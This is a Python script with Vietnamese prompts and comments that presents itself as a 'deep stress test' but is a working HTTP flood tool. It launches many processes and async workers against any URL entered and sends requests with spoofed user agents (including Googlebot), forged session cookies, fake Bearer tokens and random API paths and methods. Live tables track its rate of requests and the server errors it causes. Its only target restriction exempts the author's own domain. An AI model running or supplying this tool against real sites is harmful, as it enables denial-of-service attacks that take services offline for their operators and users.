import asyncio
import aiohttp
import random
import time
from multiprocessing import Process, Manager, cpu_count
from rich.console import Console
from rich.table import Table
from rich.live import Live
from urllib.parse import urlparse

console = Console()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

API_PATHS = [
    "/api/", "/api/v1/", "/api/v2/", "/api/user/", "/api/auth/", "/api/login/", "/api/logout/",
    "/api/register/", "/api/account/", "/api/profile/", "/api/cart/", "/api/order/", "/api/checkout/",
    "/api/data/", "/api/info/", "/api/admin/", "/api/dashboard/", "/api/upload/", "/api/download/"
]

COMMON_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH"]

COMMON_COOKIES = ["sessionid", "token", "jwt", "auth", "sid", "access_token", "refresh_token"]

COMMON_HEADERS = [
    ("X-Requested-With", "XMLHttpRequest"),
    ("Referer", "https://google.com"),
    ("Authorization", "Bearer " + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=40))),
]

def random_api_path():
    # 60% là API path, 40% là random path
    if random.random() < 0.6:
        base = random.choice(API_PATHS)
        if not base.endswith("/"):
            base += "/"
        segs = []
        for _ in range(random.randint(0, 2)):
            segs.append(''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(6, 12))))
        return base + "/".join(segs)
    else:
        segs = []
        for _ in range(random.randint(1, 3)):
            segs.append(''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(8, 20))))
        return "/" + "/".join(segs)

def random_cookies():
    # Tạo cookies giả với tên phổ biến, random giá trị
    cookies = {}
    for _ in range(random.randint(1, 4)):
        name = random.choice(COMMON_COOKIES)
        cookies[name] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(16, 32)))
    return cookies

def random_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    # Thêm 1-2 header phổ biến ngẫu nhiên
    for _ in range(random.randint(1, 2)):
        key, val = random.choice(COMMON_HEADERS)
        headers[key] = val
    return headers

def random_method():
    # GET phổ biến nhất, đôi lúc dùng method khác
    return random.choices(COMMON_METHODS, [0.5,0.2,0.1,0.1,0.05,0.05])[0]

def is_forbidden_domain(url):
    try:
        parsed = urlparse(url)
        host = parsed.netloc.lower()
        return host.endswith("nguyennamtien.shop")
    except Exception:
        return False

async def attack_worker(target_url, session, result, requests_per_worker):
    for _ in range(requests_per_worker):
        headers = random_headers()
        cookies = random_cookies()
        path = random_api_path()
        url = target_url.rstrip("/") + path
        method = random_method()
        try:
            if method in ["POST", "PUT", "PATCH"]:
                data = {"input": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10,50)))}
                async with session.request(method, url, headers=headers, cookies=cookies, timeout=5, ssl=False, data=data) as res:
                    status = res.status
            else:
                async with session.request(method, url, headers=headers, cookies=cookies, timeout=5, ssl=False) as res:
                    status = res.status

            if status == 404:
                result["error_404"] += 1
            elif 500 <= status < 600:
                result["error_5xx"] += 1
            elif status == 429:
                result["rate_limited"] += 1
            else:
                result["other"] += 1
        except Exception:
            result["fail_network"] += 1

async def attack_process(target_url, workers, result, requests_per_worker):
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=0, ssl=False)
    ) as session:
        tasks = [attack_worker(target_url, session, result, requests_per_worker) for _ in range(workers)]
        await asyncio.gather(*tasks)

def run_attack(target_url, workers, result, requests_per_worker):
    asyncio.run(attack_process(target_url, workers, result, requests_per_worker))

def pretty_table(result, total_requests, elapsed, rps):
    table = Table(title="🔥 DEEP STRESS API & COOKIE 🔥", style="bold cyan")
    table.add_column("TỔNG REQ", justify="right")
    table.add_column("404", style="red", justify="right")
    table.add_column("5xx", style="cyan", justify="right")
    table.add_column("429", style="magenta", justify="right")
    table.add_column("KHÁC", style="white", justify="right")
    table.add_column("LỖI MẠNG", style="yellow", justify="right")
    table.add_column("⏳ TIME", style="cyan", justify="right")
    table.add_column("🚀 REQ/S", style="magenta", justify="right")
    table.add_row(
        str(total_requests),
        str(result["error_404"]),
        str(result["error_5xx"]),
        str(result["rate_limited"]),
        str(result["other"]),
        str(result["fail_network"]),
        f"{elapsed:.2f}s",
        f"{rps:.2f}"
    )
    return table

if __name__ == "__main__":
    console.print(f"[bold blue]====== DEEP STRESS TEST: API & COOKIE ======[/bold blue]")
    try:
        n_cpu = cpu_count()
        console.print(f"[cyan]Khuyến nghị: process = {n_cpu}, worker/process = 50-500, request/worker = 2000-20000[/cyan]")
        num_processes = int(console.input("[yellow]Số process (tiến trình): [/yellow]"))
        workers_per_process = int(console.input("[yellow]Số async worker/process: [/yellow]"))
        requests_per_worker = int(console.input("[yellow]Số request mỗi worker gửi: [/yellow]"))
        target = console.input("[yellow]Nhập URL website bạn muốn stress test (vd: https://yourdomain.com/): [/yellow]").strip().rstrip("/")

        if is_forbidden_domain(target):
            console.print("[bold red]Cấm tuyệt đối tấn công nguyennamtien.shop hoặc bất kỳ subdomain nào![/bold red]")
            exit(1)

        total_requests = num_processes * workers_per_process * requests_per_worker

        manager = Manager()
        result = manager.dict(
            error_404=0,
            error_5xx=0,
            rate_limited=0,
            other=0,
            fail_network=0,
        )
        procs = []
        start = time.time()
        with Live(console=console, refresh_per_second=5) as live:
            for _ in range(num_processes):
                p = Process(target=run_attack, args=(target, workers_per_process, result, requests_per_worker))
                p.start()
                procs.append(p)
            while any(p.is_alive() for p in procs):
                elapsed = time.time() - start
                sent = (
                    result["error_404"] + result["error_5xx"] +
                    result["rate_limited"] + result["other"] +
                    result["fail_network"]
                )
                rps = sent / elapsed if elapsed > 0 else 0
                live.update(pretty_table(result, total_requests, elapsed, rps))
                time.sleep(0.2)
            for p in procs:
                p.join()
            elapsed = time.time() - start
            sent = (
                result["error_404"] + result["error_5xx"] +
                result["rate_limited"] + result["other"] +
                result["fail_network"]
            )
            rps = sent / elapsed if elapsed > 0 else 0
            live.update(pretty_table(result, total_requests, elapsed, rps))

        console.print(f"\n[bold green]Tổng số request gửi: {sent} (404: {result['error_404']}, 5xx: {result['error_5xx']}, 429: {result['rate_limited']}, khác: {result['other']}, lỗi mạng: {result['fail_network']})[/bold green]")
        console.print("="*60)
    except Exception as e:
        console.print(f"[bold red]Lỗi: {e}[/bold red]")